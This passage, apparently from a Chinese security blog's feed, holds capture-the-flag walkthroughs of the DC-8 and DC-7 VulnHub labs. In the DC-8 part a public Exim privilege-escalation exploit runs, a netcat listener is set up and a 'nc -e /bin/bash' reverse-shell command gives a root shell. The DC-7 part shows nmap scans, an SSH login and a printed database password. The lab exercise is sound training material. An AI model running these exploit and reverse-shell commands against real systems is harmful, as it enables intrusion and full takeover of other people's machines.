class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-8:/tmp$ ./exim.sh </span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - <span class="string">&quot;The Return of the WIZard&quot;</span> LPE exploit</span><br><span class="line">Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Preparing setuid shell helper...</span><br><span class="line">Problems compiling setuid shell helper, check your gcc.</span><br><span class="line">Falling back to the /bin/sh method.</span><br><span class="line"></span><br><span class="line">Delivering setuid payload...</span><br><span class="line">220 dc-8 ESMTP Exim 4.89 Mon, 31 Aug 2020 12:48:46 +1000</span><br><span class="line">250 dc-8 Hello localhost [::1]</span><br><span class="line">250 OK</span><br><span class="line">250 Accepted</span><br><span class="line">354 Enter message, ending with <span class="string">&quot;.&quot;</span> on a line by itself</span><br><span class="line">250 OK id=1kCZsE-0000Ie-4N</span><br><span class="line">221 dc-8 closing connection</span><br><span class="line"></span><br><span class="line">Waiting 5 seconds...</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 117208 Aug 31 12:48 /tmp/pwned</span><br><span class="line">$ </span><br></pre></td></tr></table></figure><p><code>å¸¦å‚æ•°æ‰§è¡Œ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ./exim.sh -m netcat</span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - <span class="string">&quot;The Return of the WIZard&quot;</span> LPE exploit</span><br><span class="line">Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Delivering netcat payload...</span><br><span class="line">220 dc-8 ESMTP Exim 4.89 Mon, 31 Aug 2020 12:50:17 +1000</span><br><span class="line">250 dc-8 Hello localhost [::1]</span><br><span class="line">250 OK</span><br><span class="line">250 Accepted</span><br><span class="line">354 Enter message, ending with <span class="string">&quot;.&quot;</span> on a line by itself</span><br><span class="line">250 OK id=1kCZth-0000Ix-1C</span><br><span class="line">221 dc-8 closing connection</span><br><span class="line"></span><br><span class="line">Waiting 5 seconds...</span><br><span class="line">localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>kaliç›‘å¬</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>åå¼¹shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Waiting 5 seconds...</span><br><span class="line">localhost [127.0.0.1] 31337 (?) open</span><br><span class="line">nc -e /bin/bash 192.168.1.6 6666</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 59564</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=113(Debian-exim) groups=113(Debian-exim)</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Brilliant - you have succeeded!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888</span><br><span class="line">888   o   888          888 888      888  <span class="string">&quot;Y88b                            888 888 888 888</span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888</span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888</span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888</span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span class="string">&quot;   &quot;</span>   <span class="string">&quot;   &quot;</span></span><br><span class="line">888P     Y888  <span class="string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  888  888  <span class="string">&quot;Y8888  888 888 888 888</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I&#x27;m also sending out an especially big thanks to:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@4nqr34z</span></span><br><span class="line"><span class="string">@D4mianWayne</span></span><br><span class="line"><span class="string">@0xmzfr</span></span><br><span class="line"><span class="string">@theart42</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This challenge was largely based on two things:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</span></span><br><span class="line"><span class="string">2. A suggestion from @theart42</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The answer to that question is...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-å®˜ç½‘æè¿°&quot;&gt;&lt;a href=&quot;#0x00-å®˜ç½‘æè¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.å®˜ç½‘æè¿°&quot;&gt;&lt;/a&gt;0x00.å®˜ç½‘æè¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;DC-8 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.&lt;/p&gt;
&lt;p&gt;This challenge is a bit of a hybrid between being an actual challenge, and being a â€œproof of conceptâ€ as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.&lt;/p&gt;
&lt;p&gt;The â€œproof of conceptâ€ portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.&lt;/p&gt;
&lt;p&gt;The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.&lt;/p&gt;
&lt;p&gt;You probably wouldnâ€™t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but itâ€™s definitely there and doing itâ€™s job.&lt;/p&gt;
&lt;p&gt;Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.&lt;/p&gt;
&lt;p&gt;For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    <category term="DC" scheme="https://lunamoore.github.io/categories/vulnhub/DC/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>DC-7</title>
    <link href="https://lunamoore.github.io/2020/08/28/DC-7/"/>
    <id>https://lunamoore.github.io/2020/08/28/DC-7/</id>
    <published>2020-08-28T14:20:42.000Z</published>
    <updated>2020-09-02T09:24:18.014Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote><p>DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p><p>While this isnâ€™t an overly technical challenge, it isnâ€™t exactly easy.</p><p>While itâ€™s kind of a logical progression from an earlier DC release (I wonâ€™t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably wonâ€™t succeed.</p><p>What you will need to do, is to think â€œoutsideâ€ of the box.</p><p>Waaaaaay â€œoutsideâ€ of the box. :-)</p><p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p><p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p><p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.</p></blockquote><a id="more"></a><h2 id="0x01-è€è§„çŸ©nmap"><a href="#0x01-è€è§„çŸ©nmap" class="headerlink" title="0x01.è€è§„çŸ©nmap"></a>0x01.è€è§„çŸ©nmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ8å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc7<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 05:50 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0034s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.061s latency).</span><br><span class="line">MAC Address: AC:BD:70:18:C0:9F (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/vulnhub/dc7<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†22/80ç«¯å£ï¼Œä¸”Drupalçš„ç‰ˆæœ¬ä¸º8</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># nmap -sC -sV -v 192.168.1.8 -oN nmap.demo</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 05:57 EDT</span><br><span class="line">NSE: Loaded 151 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 05:57</span><br><span class="line">Scanning 192.168.1.8 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 05:57, 0.03s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 05:57</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 05:57, 0.03s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 05:57</span><br><span class="line">Scanning 192.168.1.8 [1000 ports]</span><br><span class="line">Discovered open port 22/tcp on 192.168.1.8</span><br><span class="line">Discovered open port 80/tcp on 192.168.1.8</span><br><span class="line">Completed SYN Stealth Scan at 05:57, 0.06s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 05:57</span><br><span class="line">Scanning 2 services on 192.168.1.8</span><br><span class="line">Completed Service scan at 05:57, 7.05s elapsed (2 services on 1 host)</span><br><span class="line">NSE: Script scanning 192.168.1.8.</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 1.62s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.01s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)</span><br><span class="line">|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)</span><br><span class="line">|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03</span><br><span class="line">|_http-generator: Drupal 8 (https://www.drupal.org)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST HEAD OPTIONS</span><br><span class="line">| http-robots.txt: 22 disallowed entries (15 shown)</span><br><span class="line">| /core/ /profiles/ /README.txt /web.config /admin/ </span><br><span class="line">| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ </span><br><span class="line">| /user/password/ /user/login/ /user/<span class="built_in">logout</span>/ /index.php/admin/ </span><br><span class="line">|_/index.php/comment/reply/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Welcome to DC-7 | D7</span><br><span class="line">MAC Address: 00:0C:29:B7:50:22 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.29 seconds</span><br><span class="line">           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.036KB)</span><br><span class="line">root@JIYE:~/vulnhub/dc7<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"><a href="#0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®" class="headerlink" title="0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"></a>0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®</h2><p><code>å‘ç°ä¸€äº›ä¿¡æ¯ï¼Œæˆ‘éœ€è¦åœ¨ç›’å­å¤–é¢æ€è€ƒï¼Œè€Œä¸æ˜¯å»æš´åŠ›ç ´è§£</code></p><img src="/2020/08/28/DC-7/image-20200828180306232.png" class><p><code>æ‰¾äº†ä¸€åœˆä¹Ÿæ²¡å‘ç°å•¥ï¼Œä½†åœ¨åº•éƒ¨å‘ç°äº†ä¸€ä¸ªç”¨æˆ·çº¿ç´¢ï¼Œè¿›è¡Œè°·æ­Œæœç´¢ã€‚</code></p><img src="/2020/08/28/DC-7/image-20200828181710970.png" class><p><code>ç‚¹å‡»ç¬¬ä¸€ä¸ª</code></p><img src="/2020/08/28/DC-7/image-20200828181801820.png" class><p><code>åªæœ‰ä¸€ä¸ªé¡¹ç›®ï¼Œç‚¹è¿›å»çœ‹çœ‹</code></p><img src="/2020/08/28/DC-7/image-20200828181847093.png" class><p><code>æŸ¥çœ‹readme.txtï¼Œç¡®å®è·ŸDC-7æœ‰å…³</code></p><img src="/2020/08/28/DC-7/image-20200828181930415.png" class><p><code>æŸ¥çœ‹é…ç½®æ–‡ä»¶</code></p><img src="/2020/08/28/DC-7/image-20200828182129655.png" class><p><code>å‘ç°ç”¨æˆ·åä¸å¯†ç </code></p><img src="/2020/08/28/DC-7/image-20200828182225320.png" class><h2 id="0x04-ç™»å…¥"><a href="#0x04-ç™»å…¥" class="headerlink" title="0x04.ç™»å…¥"></a>0x04.ç™»å…¥</h2><h3 id="1-å°è¯•ç™»å…¥web-applicationï¼Œéœ¸ç‰¹å¤±è´¥äº†"><a href="#1-å°è¯•ç™»å…¥web-applicationï¼Œéœ¸ç‰¹å¤±è´¥äº†" class="headerlink" title="1.å°è¯•ç™»å…¥web applicationï¼Œéœ¸ç‰¹å¤±è´¥äº†"></a>1.å°è¯•ç™»å…¥web applicationï¼Œéœ¸ç‰¹å¤±è´¥äº†</h3><img src="/2020/08/28/DC-7/image-20200828182514271.png" class><h3 id="2-å¼€æ”¾äº†22ç«¯å£ï¼Œå°è¯•sshç™»å…¥ï¼Œç»“æœæ˜¯å¯ä»¥çš„"><a href="#2-å¼€æ”¾äº†22ç«¯å£ï¼Œå°è¯•sshç™»å…¥ï¼Œç»“æœæ˜¯å¯ä»¥çš„" class="headerlink" title="2.å¼€æ”¾äº†22ç«¯å£ï¼Œå°è¯•sshç™»å…¥ï¼Œç»“æœæ˜¯å¯ä»¥çš„"></a>2.å¼€æ”¾äº†22ç«¯å£ï¼Œå°è¯•sshç™»å…¥ï¼Œç»“æœæ˜¯å¯ä»¥çš„</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc7<span class="comment"># ssh dc7user@192.168.1.8</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.8 (192.168.1.8)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:J5aG8w2iY0G0Nh3p4L+WzXXaQ7O1GjFTlfAYwkBIbM4.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.8<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">dc7user@192.168.1.8&#x27;</span>s password: </span><br><span class="line">Linux dc-7 4.9.0-9-amd64 <span class="comment">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">You have new mail.</span><br><span class="line">Last login: Fri Aug 30 03:10:09 2019 from 192.168.0.100</span><br><span class="line">dc7user@dc-7:~$ whoami</span><br><span class="line">dc7user</span><br><span class="line">dc7user@dc-7:~$</span><br></pre></td></tr></table></figure><h2 id="0x05-æŸ¥çœ‹ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œå¹¶å‘ç°ä¸€å°é‚®ä»¶"><a href="#0x05-æŸ¥çœ‹ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œå¹¶å‘ç°ä¸€å°é‚®ä»¶" class="headerlink" title="0x05.æŸ¥çœ‹ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œå¹¶å‘ç°ä¸€å°é‚®ä»¶"></a>0x05.æŸ¥çœ‹ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œå¹¶å‘ç°ä¸€å°é‚®ä»¶</h2><p><code>å‘ç°å¼€å¯äº†3306</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ netstat -pantu</span><br><span class="line">-bash: netstat: <span class="built_in">command</span> not found</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br><span class="line">dc7user@dc-7:~$ ss -pantu</span><br><span class="line">Netid  State      Recv-Q Send-Q                         Local Address:Port                                        Peer Address:Port              </span><br><span class="line">udp    UNCONN     0      0                                          *:68                                                     *:*                  </span><br><span class="line">tcp    LISTEN     0      80                                 127.0.0.1:3306                                                   *:*                  </span><br><span class="line">tcp    LISTEN     0      128                                        *:22                                                     *:*                  </span><br><span class="line">tcp    LISTEN     0      20                                 127.0.0.1:25                                                     *:*                  </span><br><span class="line">tcp    ESTAB      0      0                                192.168.1.8:22                                           192.168.1.6:47064              </span><br><span class="line">tcp    LISTEN     0      128                                       :::80                                                    :::*                  </span><br><span class="line">tcp    LISTEN     0      128                                       :::22                                                    :::*                  </span><br><span class="line">tcp    LISTEN     0      20                                       ::1:25                                                    :::*                  </span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹æ•°æ®åº“ç”¨æˆ·ä¸å¯†ç </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:/var/www/html/sites/default$ cat settings.php</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="variable">$databases</span>[<span class="string">&#x27;default&#x27;</span>][<span class="string">&#x27;default&#x27;</span>] = array (</span><br><span class="line">  <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;d7db&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;db7user&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;yNv3Po00&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;namespace&#x27;</span> =&gt; <span class="string">&#x27;Drupal\\Core\\Database\\Driver\\mysql&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>ç™»å…¥æ•°æ®åº“ï¼Œå‘ç°adminå­˜åœ¨</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 